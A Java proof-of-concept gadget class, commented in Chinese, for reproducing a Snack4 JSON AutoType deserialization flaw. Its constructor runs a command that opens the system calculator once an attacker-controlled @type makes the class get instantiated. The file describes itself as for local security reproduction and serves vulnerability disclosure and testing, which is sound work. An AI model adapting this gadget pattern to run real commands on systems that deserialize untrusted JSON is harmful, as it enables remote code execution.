package com.pj.poc;

/**
 * Snack4 AutoType PoC 用 gadget 类（仅用于本地安全复现，勿用于生产）。
 *
 * <p>真实攻击不会自带此类，而是利用 classpath 上已有的 gadget；
 * 此处用「无参构造里执行命令」证明：一旦 JSON 里的 {@code @type} 可被攻击者控制，
 * {@code SaJsonTemplateForSnack4} 就会实例化未授权类型。</p>
 */
public class Snack4RceGadget {

	public Snack4RceGadget() {
		try {
			String os = System.getProperty("os.name", "").toLowerCase();
			ProcessBuilder pb;
			if (os.contains("win")) {
				pb = new ProcessBuilder("calc.exe");
			} else if (os.contains("mac")) {
				pb = new ProcessBuilder("open", "-a", "Calculator");
			} else {
				pb = new ProcessBuilder("xcalc");
			}
			pb.start();
			System.out.println("[Snack4-RCE-PoC] gadget 已执行，尝试弹出计算器");
		} catch (Exception e) {
			throw new RuntimeException("[Snack4-RCE-PoC] gadget 执行失败", e);
		}
	}

}
